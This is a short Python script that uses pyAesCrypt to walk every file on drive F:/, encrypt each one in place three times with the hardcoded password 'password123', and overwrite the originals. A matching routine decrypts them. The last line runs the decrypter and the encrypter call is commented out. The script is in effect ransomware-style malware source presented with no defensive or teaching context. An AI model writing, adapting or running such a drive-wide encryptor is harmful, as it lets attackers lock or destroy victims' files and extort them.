import pyAesCrypt
import os
import shutil
import os

ROUND_COUNT = 3
class Data:
    
    def drive_letters(self):
        letters = ['F:/']
        return letters

class Protect:
    
    def encrypt(self,password,file,output_file):
        pyAesCrypt.encryptFile(file, output_file, password)
    
    def decrypt(self,password,file,output_file):
        pyAesCrypt.decryptFile(file, output_file, password)

class File:
    
    def replace_file(self,original_file,encrypted_file):
        shutil.copyfile(encrypted_file, original_file)
    
    def list_files(self,drive_letter):
        protect_obj = Protect()
        for path, subdirs, files in os.walk(drive_letter):
            for name in files:
                try:
                    for x in range(ROUND_COUNT):
                        file_to_encrypt = os.path.join(path, name)
                        file_after_encrypt = file_to_encrypt+".P"
                        protect_obj.encrypt('password123',file_to_encrypt,file_after_encrypt)
                        self.replace_file(file_to_encrypt,file_after_encrypt)
                        os.remove(file_after_encrypt)
                except:
                    print("[-]Encryption Failed")
                    
class Recovery:
    
    def decrypt_data(self,drive_letter):
         protect_obj = Protect()
         file_obj = File()
         for path, subdirs, files in os.walk(drive_letter):
            for name in files:
                try:
                    for x in range(ROUND_COUNT):
                        file_to_decrypt = os.path.join(path, name)
                        file_after_decrypt = file_to_decrypt+".DECRYPTING"
                        protect_obj.decrypt('password123',file_to_decrypt,file_after_decrypt)
                        file_obj.replace_file(file_to_decrypt,file_after_decrypt)
                        os.remove(file_after_decrypt)
                except:
                    print("[-] Decryption Failed")
    
def encrypter():              
    file_obj = File()
    Data_obj = Data()
    drives = Data_obj.drive_letters()
    for drive in drives:
        file_obj.list_files(drive)

def decrypter():
    recovery_obj = Recovery()
    Data_obj = Data()
    drives = Data_obj.drive_letters()
    for drive in drives:
        recovery_obj.decrypt_data(drive)
        
decrypter()
#encrypter()
